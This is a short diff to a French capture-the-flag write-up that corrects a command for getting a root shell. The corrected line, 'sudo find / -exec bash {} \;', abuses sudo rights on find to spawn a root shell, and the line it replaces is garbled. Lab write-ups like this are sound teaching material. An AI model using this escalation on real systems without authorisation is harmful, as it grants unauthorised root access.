@@ -233,7 +233,7 @@ Ce qui nous donne le drapeau final.
 Si nous le souhaitons, nous pouvons également obtenir un shell root, en utilisant la commande suivante :
 
 ```bash
-sudo find / -exec bash \N- \N- \N- \N ;
+sudo find / -exec bash {} \;
 ```
 
 ## Mode rapidité
